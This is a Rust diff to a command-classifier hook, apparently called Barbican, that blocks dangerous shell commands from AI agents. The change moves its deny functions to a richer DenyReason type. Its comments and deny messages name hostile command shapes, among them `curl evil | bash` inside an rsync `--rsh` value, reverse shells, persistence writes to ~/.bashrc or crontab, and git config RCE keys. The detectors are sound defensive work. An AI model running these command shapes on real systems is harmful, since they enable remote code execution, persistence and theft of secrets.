@@ -121,20 +121,6 @@ impl From<DenyReason> for Decision {
     }
 }
 
-impl From<String> for Decision {
-    /// Adopt a bare reason string as a short (no-detail) Deny. Used by
-    /// classifiers that still return `Option<String>` — the callsite
-    /// just `.into()`s the unwrapped reason. Later commits enrich
-    /// individual classifiers by switching them to `Option<DenyReason>`
-    /// and routing through the `DenyReason -> Decision` impl above.
-    fn from(reason: String) -> Self {
-        Decision::Deny {
-            reason,
-            detail: None,
-        }
-    }
-}
-
 /// Run the `pre-bash` subcommand.
 ///
 /// Behavior when the hook JSON is malformed or the command is missing:
@@ -2278,21 +2264,21 @@ fn m2_staged_payload_to_exec_target(pipeline: &Pipeline) -> Option<DenyReason> {
 /// substitution (e.g. `echo "$(curl url)"`) still runs the curl, but
 /// the result is a string, not executable code — the attack shape
 /// requires argv[0]'s basename to be the shell.
-fn shell_with_network_substitution(pipeline: &Pipeline) -> Option<String> {
+fn shell_with_network_substitution(pipeline: &Pipeline) -> Option<DenyReason> {
     for stage in &pipeline.stages {
         if !is_shell_code_sink(&stage.basename) {
             continue;
         }
         for sub in &stage.substitutions {
             if script_contains_network_tool_transitively(sub) {
-                return Some(format!(
+                return Some(DenyReason::short(format!(
                     "blocked: shell interpreter `{sh}` reads a \
                      network-tool substitution (curl/wget inside \
                      `$(...)` or `<(...)`, possibly via laundering \
                      layers like `echo $(curl ...)`) — \
                      download-and-execute shape",
                     sh = stage.basename,
-                ));
+                )));
             }
         }
     }
@@ -2321,7 +2307,7 @@ fn shell_with_network_substitution(pipeline: &Pipeline) -> Option<String> {
 /// 2. any upstream stage in the SAME pipeline is a network tool
 ///    (covers `curl … | tee >(bash)`: tee is not network but the
 ///    stage before it is).
-fn network_with_shell_sink_substitution(pipeline: &Pipeline) -> Option<String> {
+fn network_with_shell_sink_substitution(pipeline: &Pipeline) -> Option<DenyReason> {
     let mut upstream_has_network = false;
     for stage in &pipeline.stages {
         let stage_is_net = is_curl_or_wget(&stage.basename);
@@ -2373,7 +2359,7 @@ fn network_with_shell_sink_substitution(pipeline: &Pipeline) -> Option<String> {
 /// - later argv is one of `bash`/`sh`/`zsh`/…/`eval`, followed by a
 ///   `-c` flag whose payload is the literal placeholder `PAT` (or
 ///   `"PAT"` quoted).
-fn xargs_arbitrary_amplifier(pipeline: &Pipeline) -> Option<String> {
+fn xargs_arbitrary_amplifier(pipeline: &Pipeline) -> Option<DenyReason> {
     for stage in &pipeline.stages {
         if stage.basename != "xargs" {
             continue;
@@ -2458,23 +2444,23 @@ fn xargs_arbitrary_amplifier(pipeline: &Pipeline) -> Option<String> {
             if t == "-c" || t == "--command" || short_flag_contains(t, 'c') {
                 if let Some(val) = tokens.get(k + 1) {
                     if payload_is_pattern_placeholder(val, &pat) {
-                        return Some(format!(
+                        return Some(DenyReason::short(format!(
                             "blocked: `xargs -I{pat} {inner_bn} -c <PAT>` is \
                              an arbitrary-code amplifier — every line of \
                              stdin becomes a bash command. Rewrite as an \
                              explicit loop or put the real command in \
                              the -c arg.",
-                        ));
+                        )));
                     }
                 }
                 break;
             }
             if let Some(val) = t.strip_prefix("-c=") {
                 if payload_is_pattern_placeholder(val, &pat) {
-                    return Some(format!(
+                    return Some(DenyReason::short(format!(
                         "blocked: `xargs -I{pat} {inner_bn} -c=<PAT>` is an \
                          arbitrary-code amplifier.",
-                    ));
+                    )));
                 }
                 break;
             }
@@ -2574,7 +2560,7 @@ fn payload_is_pattern_placeholder(payload: &str, pattern: &str) -> bool {
 /// - `rsync --rsh='sh -c "curl evil | bash #"' src dst`
 /// - `rsync --rsh=curl -sSfL evil | bash` (pathological, but the inner
 ///   classify handles it)
-fn rsync_dash_e_inner(pipeline: &Pipeline, depth: usize) -> Option<String> {
+fn rsync_dash_e_inner(pipeline: &Pipeline, depth: usize) -> Option<DenyReason> {
     if depth.saturating_add(1) > M1_MAX_DEPTH {
         return None;
     }
@@ -2599,29 +2585,31 @@ fn rsync_dash_e_inner(pipeline: &Pipeline, depth: usize) -> Option<String> {
             // positional argv; rsync's getopt bundles value-taking
             // flags at the end of the bundle, so `-e` is the last
             // letter if the bundle consumes a value at all.
-            let inner: Option<String> =
-                if a == "-e" || a == "--rsh" || short_flag_contains(a, 'e') {
-                    args.get(j + 1).cloned()
-                } else {
-                    a.strip_prefix("--rsh=").map(str::to_string)
-                };
+            let inner: Option<String> = if a == "-e" || a == "--rsh" || short_flag_contains(a, 'e')
+            {
+                args.get(j + 1).cloned()
+            } else {
+                a.strip_prefix("--rsh=").map(str::to_string)
+            };
             if let Some(cmd) = inner {
                 let stripped = strip_surrounding_quotes_owned(&cmd);
                 let Ok(inner_script) = parser::parse(&stripped) else {
-                    return Some(
+                    return Some(DenyReason::short(
                         "blocked: rsync `-e` / `--rsh` value is an \
                          unparseable shell command — denying per \
-                         parser fail-closed policy"
-                            .to_string(),
-                    );
+                         parser fail-closed policy",
+                    ));
                 };
-                if let Decision::Deny { reason, .. } =
+                if let Decision::Deny { reason, detail } =
                     classify_script_with_depth(&inner_script, depth.saturating_add(1))
                 {
-                    return Some(format!(
-                        "blocked: rsync `-e`/`--rsh` value executes as a \
-                         shell command on rsync invocation — inner: {reason}",
-                    ));
+                    return Some(DenyReason {
+                        reason: format!(
+                            "blocked: rsync `-e`/`--rsh` value executes as a \
+                             shell command on rsync invocation — inner: {reason}",
+                        ),
+                        detail,
+                    });
                 }
             }
             j += 1;
@@ -2662,7 +2650,7 @@ fn rsync_dash_e_inner(pipeline: &Pipeline, depth: usize) -> Option<String> {
 /// itself is the persistence sink.
 ///
 /// 1.2.0 8th-pass adversarial review (GPT HIGH 8GH1).
-fn scheduler_persistence(pipeline: &Pipeline) -> Option<String> {
+fn scheduler_persistence(pipeline: &Pipeline) -> Option<DenyReason> {
     for stage in &pipeline.stages {
         let bn = stage_bn_lc(stage);
         match bn.as_ref() {
@@ -2677,21 +2665,20 @@ fn scheduler_persistence(pipeline: &Pipeline) -> Option<String> {
                         .iter()
                         .any(|a| a == "-" || a == "-r" || a == "-e" || a == "--remove");
                 if !is_list_only {
-                    return Some(
+                    return Some(DenyReason::short(
                         "blocked: `crontab` invocation writes / edits / \
                          replaces the user's crontab. This is the \
                          classic Unix persistence channel; Barbican \
-                         treats any write-shape crontab as persistence."
-                            .to_string(),
-                    );
+                         treats any write-shape crontab as persistence.",
+                    ));
                 }
             }
             "at" | "batch" => {
-                return Some(format!(
+                return Some(DenyReason::short(format!(
                     "blocked: `{bn}` schedules a command for later \
                      execution (one-shot persistence). Run the \
                      intended command directly instead.",
-                ));
+                )));
             }
             "systemd-run" => {
                 // systemd-run WITH a timer option is persistence;
@@ -2701,10 +2688,10 @@ fn scheduler_persistence(pipeline: &Pipeline) -> Option<String> {
                         || a.starts_with("--timer-")
                         || a == "--timer-property"
                     {
-                        return Some(format!(
+                        return Some(DenyReason::short(format!(
                             "blocked: `systemd-run {a}` installs a \
                              persistent systemd timer.",
-                        ));
+                        )));
                     }
                 }
             }
@@ -2715,7 +2702,7 @@ fn scheduler_persistence(pipeline: &Pipeline) -> Option<String> {
 }
 
 #[allow(clippy::case_sensitive_file_extension_comparisons)]
-fn pip_editable_vcs_install(pipeline: &Pipeline) -> Option<String> {
+fn pip_editable_vcs_install(pipeline: &Pipeline) -> Option<DenyReason> {
     for stage in &pipeline.stages {
         let bn = stage_bn_lc(stage);
         if !matches!(bn.as_ref(), "pip" | "pip3" | "pipx" | "uv" | "poetry") {
@@ -2745,12 +2732,12 @@ fn pip_editable_vcs_install(pipeline: &Pipeline) -> Option<String> {
             let is_url = lower.starts_with("http://") || lower.starts_with("https://");
             // Direct git+... / hg+... / svn+... install.
             if is_vcs {
-                return Some(format!(
+                return Some(DenyReason::short(format!(
                     "blocked: `{bn} install {a}` fetches and runs an \
                      arbitrary VCS repository's `setup.py` / PEP 517 \
                      backend as install-time code. Pin to a known \
                      package index instead.",
-                ));
+                )));
             }
             // `pip install URL#egg=` or tarball from URL.
             if is_url
@@ -2760,26 +2747,26 @@ fn pip_editable_vcs_install(pipeline: &Pipeline) -> Option<String> {
                     || lower.ends_with(".whl")
                     || lower.contains("#egg="))
             {
-                return Some(format!(
+                return Some(DenyReason::short(format!(
                     "blocked: `{bn} install {a}` fetches a package \
                      archive from a raw URL and runs its install-time \
                      hooks. Pin to the package index instead.",
-                ));
+                )));
             }
             // `pip install "foo @ git+…"` — PEP 508 direct URL syntax.
             if lower.contains("@ git+") || lower.contains("@git+") || lower.contains("@ http") {
-                return Some(format!(
+                return Some(DenyReason::short(format!(
                     "blocked: `{bn} install {a}` uses PEP 508 direct-URL \
                      syntax to fetch a VCS or URL package; install-time \
                      code runs with full privilege.",
-                ));
+                )));
             }
         }
     }
     None
 }
 
-fn tar_command_exec(pipeline: &Pipeline, depth: usize) -> Option<String> {
+fn tar_command_exec(pipeline: &Pipeline, depth: usize) -> Option<DenyReason> {
     if depth.saturating_add(1) > M1_MAX_DEPTH {
         return None;
     }
@@ -2815,8 +2802,8 @@ fn tar_command_exec(pipeline: &Pipeline, depth: usize) -> Option<String> {
                     (None, None)
                 };
             if let (Some(flag), Some(raw)) = (flag, raw) {
-                if let Some(reason) = classify_tar_inner(flag, raw, depth) {
-                    return Some(reason);
+                if let Some(r) = classify_tar_inner(flag, raw, depth) {
+                    return Some(r);
                 }
             }
             i += 1;
@@ -2860,42 +2847,46 @@ fn tar_strip_checkpoint_action_prefix_eq(a: &str) -> Option<&str> {
     }
 }
 
-fn classify_tar_inner(flag: &str, raw: &str, depth: usize) -> Option<String> {
+fn classify_tar_inner(flag: &str, raw: &str, depth: usize) -> Option<DenyReason> {
     let stripped = strip_surrounding_quotes_owned(raw);
     match parser::parse(&stripped) {
         Ok(inner) => {
-            if let Decision::Deny { reason, .. } =
+            if let Decision::Deny { reason, detail } =
                 classify_script_with_depth(&inner, depth.saturating_add(1))
             {
-                return Some(format!(
-                    "blocked: tar `{flag}={stripped}` executes as a \
-                     shell command — inner: {reason}",
-                ));
+                return Some(DenyReason {
+                    reason: format!(
+                        "blocked: tar `{flag}={stripped}` executes as a \
+                         shell command — inner: {reason}",
+                    ),
+                    detail,
+                });
             }
         }
         Err(_) => {
-            return Some(format!(
+            return Some(DenyReason::short(format!(
                 "blocked: tar `{flag}={stripped}` is an unparseable \
                  shell command — denying per parser fail-closed policy",
-            ));
+            )));
         }
     }
     if scan_payload_for_exfil(&stripped) {
-        return Some(format!(
+        return Some(DenyReason::short(format!(
             "blocked: tar `{flag}={stripped}` would run a shell \
              command that references a network tool / secret path — \
              download-or-exfil shape.",
-        ));
+        )));
     }
     None
 }
 
-fn shell_sink_procsub_reason() -> String {
-    "blocked: network stage (curl/wget or a downstream of one in the \
-     same pipeline) writes to a shell-code sink process substitution \
-     (`>(bash)`, `>(sh -c …)`, `>(eval …)`) — download-and-execute \
-     shape via procsub"
-        .to_string()
+fn shell_sink_procsub_reason() -> DenyReason {
+    DenyReason::short(
+        "blocked: network stage (curl/wget or a downstream of one in the \
+         same pipeline) writes to a shell-code sink process substitution \
+         (`>(bash)`, `>(sh -c …)`, `>(eval …)`) — download-and-execute \
+         shape via procsub",
+    )
 }
 
 /// Textual detector for redirect targets that are a process substitution
@@ -2989,7 +2980,7 @@ fn script_contains_network_tool_transitively(script: &crate::parser::Script) -> 
 /// 1.2.0 adversarial review (Claude S2 / S6): before 1.2.0 the parser
 /// dropped heredoc bodies and the classifier never inspected
 /// here-string bodies, so both shapes were full H1 bypasses.
-fn shell_with_heredoc_or_herestring_body(pipeline: &Pipeline, depth: usize) -> Option<String> {
+fn shell_with_heredoc_or_herestring_body(pipeline: &Pipeline, depth: usize) -> Option<DenyReason> {
     if depth.saturating_add(1) > M1_MAX_DEPTH {
         return None;
     }
@@ -3016,21 +3007,24 @@ fn shell_with_heredoc_or_herestring_body(pipeline: &Pipeline, depth: usize) -> O
             // through the classifier. If anything in the body would
             // deny on its own, fail the whole command.
             let Ok(inner) = parser::parse(&body) else {
-                return Some(format!(
+                return Some(DenyReason::short(format!(
                     "blocked: shell interpreter `{sh}` reads an \
                      unparseable heredoc / here-string body — denying \
                      per parser fail-closed policy",
                     sh = stage.basename,
-                ));
+                )));
             };
-            if let Decision::Deny { reason, .. } =
+            if let Decision::Deny { reason, detail } =
                 classify_script_with_depth(&inner, depth.saturating_add(1))
             {
-                return Some(format!(
-                    "blocked: shell interpreter `{sh}` executes a \
-                     heredoc / here-string body — inner: {reason}",
-                    sh = stage.basename,
-                ));
+                return Some(DenyReason {
+                    reason: format!(
+                        "blocked: shell interpreter `{sh}` executes a \
+                         heredoc / here-string body — inner: {reason}",
+                        sh = stage.basename,
+                    ),
+                    detail,
+                });
             }
         }
     }
@@ -3066,7 +3060,7 @@ fn shell_with_heredoc_or_herestring_body(pipeline: &Pipeline, depth: usize) -> O
 /// the classifier.
 ///
 /// 1.2.1 6th-pass Claude-review M-1 finding.
-fn shell_with_stdin_script(pipeline: &Pipeline, depth: usize) -> Option<String> {
+fn shell_with_stdin_script(pipeline: &Pipeline, depth: usize) -> Option<DenyReason> {
     if depth.saturating_add(1) > M1_MAX_DEPTH {
         return None;
     }
@@ -3114,13 +3108,13 @@ fn shell_with_stdin_script(pipeline: &Pipeline, depth: usize) -> Option<String> 
         // scanner would flag (secret + network, env-dump + network,
         // /dev/tcp/*) is denied.
         if scan_payload_for_exfil(&payload) {
-            return Some(format!(
+            return Some(DenyReason::short(format!(
                 "blocked: shell interpreter `{sh} -s` reads its script \
                  from stdin, and the upstream pipeline stages emit a \
                  curl-to-shell / secret-exfil / reverse-shell payload — \
                  whatever the upstream stage writes becomes executed bash",
                 sh = stage.basename,
-            ));
+            )));
         }
         // Wider net: network-tool word + a shell-sink word (bash, sh,
         // eval, source, `.`) inside the payload string. `echo 'curl |
@@ -3129,29 +3123,32 @@ fn shell_with_stdin_script(pipeline: &Pipeline, depth: usize) -> Option<String> 
         // network-tool word AND a shell-code sink word in the payload
         // is the whole point of the `-s` stdin-execute shape.
         if network_tool_word_regex().is_match(&payload) && payload_references_shell_sink(&payload) {
-            return Some(format!(
+            return Some(DenyReason::short(format!(
                 "blocked: shell interpreter `{sh} -s` reads its script \
                  from stdin, and the upstream pipeline stages emit text \
                  containing both a network tool (curl/wget/nc/…) and a \
                  shell-code sink (bash/sh/eval/source/.) — \
                  download-and-execute via stdin",
                 sh = stage.basename,
-            ));
+            )));
         }
         // Defense-in-depth: re-parse the payload and run it through
         // the classifier. If the upstream stage literally prints a
         // script that would itself deny, we deny too. This catches
         // nested shapes like `printf 'base64 -d blob > ~/.bashrc' | sh -s`.
         if let Ok(inner) = parser::parse(&payload) {
-            if let Decision::Deny { reason, .. } =
+            if let Decision::Deny { reason, detail } =
                 classify_script_with_depth(&inner, depth.saturating_add(1))
             {
-                return Some(format!(
-                    "blocked: shell interpreter `{sh} -s` reads its \
-                     script from stdin — upstream payload classifies \
-                     as: {reason}",
-                    sh = stage.basename,
-                ));
+                return Some(DenyReason {
+                    reason: format!(
+                        "blocked: shell interpreter `{sh} -s` reads its \
+                         script from stdin — upstream payload classifies \
+                         as: {reason}",
+                        sh = stage.basename,
+                    ),
+                    detail,
+                });
             }
         }
     }
@@ -3222,7 +3219,7 @@ fn strip_surrounding_quotes_owned(s: &str) -> String {
 /// heredoc writes (`cat > ~/.bashrc <<EOF`); both are captured because
 /// the parser's `effective_out_file_target` + argv-based `tee/dd/cp`
 /// output target cover both forms.
-fn persistence_write_to_shell_startup(pipeline: &Pipeline) -> Option<String> {
+fn persistence_write_to_shell_startup(pipeline: &Pipeline) -> Option<DenyReason> {
     for stage in &pipeline.stages {
         // Cover shell redirects (`>` / `>>`), tee/uudecode argv
         // outputs, and file-copy tool destinations (cp/mv/install/ln/
@@ -3237,12 +3234,12 @@ fn persistence_write_to_shell_startup(pipeline: &Pipeline) -> Option<String> {
         ];
         for target in targets.iter().flatten() {
             if is_persistence_target(target) {
-                return Some(format!(
+                return Some(DenyReason::short(format!(
                     "blocked: write to shell-startup / persistence path \
                      `{t}` — next login or service start would execute \
                      this content (persistence-class)",
                     t = sanitize_reason_text(target),
-                ));
+                )));
             }
         }
     }
@@ -3497,7 +3494,7 @@ fn network_tool_word_regex() -> &'static regex::Regex {
 /// False-positive risk: agents legitimately `chmod +x` a newly-built
 /// helper in the working tree. We restrict to well-known
 /// attacker-writeable directories to minimize impact.
-fn chmod_plus_x_attacker_path(pipeline: &Pipeline) -> Option<String> {
+fn chmod_plus_x_attacker_path(pipeline: &Pipeline) -> Option<DenyReason> {
     for stage in &pipeline.stages {
         if stage_bn_lc(stage) != "chmod" {
             continue;
@@ -3526,7 +3523,7 @@ fn chmod_plus_x_attacker_path(pipeline: &Pipeline) -> Option<String> {
         }
         for t in &targets {
             if path_in_attacker_writable_dir(t) {
-                return Some(format!(
+                return Some(DenyReason::short(format!(
                     "blocked: `chmod +x {t}` — granting execute to a \
                      file in an attacker-writeable directory \
                      (/tmp, /var/tmp, /dev/shm, ~/Downloads, ~/.cache). \
@@ -3534,7 +3531,7 @@ fn chmod_plus_x_attacker_path(pipeline: &Pipeline) -> Option<String> {
                      amplifier — rewrite the workflow to put the \
                      binary in a user-owned directory the agent \
                      didn't write into.",
-                ));
+                )));
             }
         }
     }
@@ -4396,7 +4393,7 @@ fn awk_looks_like_filename(s: &str) -> bool {
 ///
 /// 1.2.0 5th-pass adversarial review (Claude SEVERE S-4).
 #[allow(clippy::too_many_lines)]
-fn git_config_injection(pipeline: &Pipeline) -> Option<String> {
+fn git_config_injection(pipeline: &Pipeline) -> Option<DenyReason> {
     // Exact dangerous keys whose value will be executed.
     const DANGEROUS_KEYS: &[&str] = &[
         "core.pager",
@@ -4463,14 +4460,14 @@ fn git_config_injection(pipeline: &Pipeline) -> Option<String> {
         for (name, value) in &stage.assignments {
             let upper = name.to_ascii_uppercase();
             if GIT_ENV_EXEC_VARS.contains(&upper.as_ref()) {
-                return Some(format!(
+                return Some(DenyReason::short(format!(
                     "blocked: `{name}={value}` is a git env var that \
                      names a shell command git executes on the next \
                      operation. These are direct RCE channels \
                      (`GIT_SSH_COMMAND`, `GIT_PROXY_COMMAND`, \
                      `GIT_EDITOR`, `GIT_PAGER`, `GIT_ASKPASS`, \
                      `GIT_EXTERNAL_DIFF`).",
-                ));
+                )));
             }
             if GIT_ENV_DIR_VARS.contains(&upper.as_ref()) {
                 // Pointing git at an attacker-writeable directory
@@ -4479,13 +4476,13 @@ fn git_config_injection(pipeline: &Pipeline) -> Option<String> {
                 // are presumed user-controlled.
                 let stripped = strip_surrounding_quotes_owned(value);
                 if path_in_attacker_writable_dir(&stripped) {
-                    return Some(format!(
+                    return Some(DenyReason::short(format!(
                         "blocked: `{name}={value}` points git at an \
                          attacker-writeable directory. The on-disk \
                          `.git/config` there could contain `core.pager=\
                          !…`, `core.fsmonitor`, etc. which git runs \
                          on the next operation.",
-                    ));
+                    )));
                 }
             }
         }
@@ -4519,14 +4516,14 @@ fn git_config_injection(pipeline: &Pipeline) -> Option<String> {
                 // Exact keys.
                 for key in DANGEROUS_KEYS {
                     if lower.starts_with(&format!("{key}=")) {
-                        return Some(format!(
+                        return Some(DenyReason::short(format!(
                             "blocked: `git` config override `{kv}` \
                              targets a key that git executes as a \
                              shell command on the next operation \
                              (`core.pager=!…`, `core.fsmonitor`, \
                              `core.gpgprogram`, `protocol.ext.allow`, \
                              `include.path`, etc.).",
-                        ));
+                        )));
                     }
                 }
                 // Prefix + suffix classes.
@@ -4545,35 +4542,35 @@ fn git_config_injection(pipeline: &Pipeline) -> Option<String> {
                         let value = &kv[eq + 1..];
                         let trimmed = value.trim().trim_matches(|c| c == '\'' || c == '"');
                         if trimmed.starts_with('!') {
-                            return Some(format!(
+                            return Some(DenyReason::short(format!(
                                 "blocked: `git` config override \
                                  `{kv}` defines an alias whose value \
                                  starts with `!` (git shell-escape). \
                                  An alias registered this way is \
                                  executable shell on the next \
                                  invocation.",
-                            ));
+                            )));
                         }
                     } else if key_only.ends_with(suffix) {
-                        return Some(format!(
+                        return Some(DenyReason::short(format!(
                             "blocked: `git` config override `{kv}` \
                              targets a `{prefix}*{suffix}` key that \
                              git executes on the next operation. \
                              These are well-known RCE channels.",
-                        ));
+                        )));
                     }
                 }
             }
             // `git clone ext::…` — external-transport helper.
             if a == "clone" || i > 0 && args[i - 1] == "clone" {
                 if let Some(url) = args.iter().find(|s| s.starts_with("ext::")) {
-                    return Some(format!(
+                    return Some(DenyReason::short(format!(
                         "blocked: `git clone {url}` uses the `ext::` \
                          transport helper, which executes an arbitrary \
                          shell command as the transport. Requires \
                          `protocol.ext.allow=always` but we fail \
                          closed — never legitimate from an agent.",
-                    ));
+                    )));
                 }
             }
             // 1.2.0 7th-pass review (Claude+GPT HIGH 7H1): `git -C DIR`
@@ -4597,7 +4594,7 @@ fn git_config_injection(pipeline: &Pipeline) -> Option<String> {
             };
             if let Some(dir) = pivot_dir {
                 if path_in_attacker_writable_dir(dir) {
-                    return Some(format!(
+                    return Some(DenyReason::short(format!(
                         "blocked: `git` is being pointed at an \
                          attacker-writeable directory (`{dir}`) via \
                          `-C`/`--git-dir`/`--work-tree`. The on-disk \
@@ -4605,7 +4602,7 @@ fn git_config_injection(pipeline: &Pipeline) -> Option<String> {
                          DANGEROUS_KEYS entry (core.pager=!…, \
                          core.fsmonitor, etc.) that git will execute \
                          on the next operation.",
-                    ));
+                    )));
                 }
             }
             i += 1;
@@ -4628,7 +4625,7 @@ fn git_config_injection(pipeline: &Pipeline) -> Option<String> {
 /// Gate: fire only when the stage's argv[0] is a shell interpreter,
 /// so setting `PROMPT_COMMAND` for an unrelated tool (a legitimate
 /// use) doesn't trip.
-fn shell_env_injection(pipeline: &Pipeline) -> Option<String> {
+fn shell_env_injection(pipeline: &Pipeline) -> Option<DenyReason> {
     const SHELL_STARTUP_EXEC_VARS: &[&str] = &[
         // bash reads this on every interactive prompt.
         "PROMPT_COMMAND",
@@ -4670,7 +4667,7 @@ fn shell_env_injection(pipeline: &Pipeline) -> Option<String> {
         for (name, value) in &stage.assignments {
             let upper = name.to_ascii_uppercase();
             if SHELL_STARTUP_EXEC_VARS.contains(&upper.as_ref()) {
-                return Some(format!(
+                return Some(DenyReason::short(format!(
                     "blocked: `{name}={value}` is a shell startup / \
                      prompt env var that a shell interpreter in this \
                      pipeline executes as a command string on next \
@@ -4680,7 +4677,7 @@ fn shell_env_injection(pipeline: &Pipeline) -> Option<String> {
                      env value. Wrapper-smuggled forms like \
                      `sudo PROMPT_COMMAND=… bash -i` are caught here \
                      because wrappers pass the env through to the child."
-                ));
+                )));
             }
         }
     }
@@ -4691,7 +4688,7 @@ fn shell_env_injection(pipeline: &Pipeline) -> Option<String> {
 /// unconditional deny. Without that env var, a bare `git push` with
 /// no secret reference is allowed; with it, even benign git is blocked
 /// so attackers can't quietly use it as the exfil channel.
-fn m2_git_hard_deny(pipeline: &Pipeline) -> Option<String> {
+fn m2_git_hard_deny(pipeline: &Pipeline) -> Option<DenyReason> {
     if !env_flag("BARBICAN_GIT_HARD_DENY") {
         return None;
     }
@@ -4699,11 +4696,11 @@ fn m2_git_hard_deny(pipeline: &Pipeline) -> Option<String> {
         .stages
         .iter()
         .find(|s| stage_bn_lc(s).as_ref() == "git")?;
-    Some(format!(
+    Some(DenyReason::short(format!(
         "blocked: `{git}` invocation denied by BARBICAN_GIT_HARD_DENY=1 \
          (M2 — git network-tool hard-deny)",
         git = git_stage.basename,
-    ))
+    )))
 }
 
 /// Filename extensions associated with executable content (matched
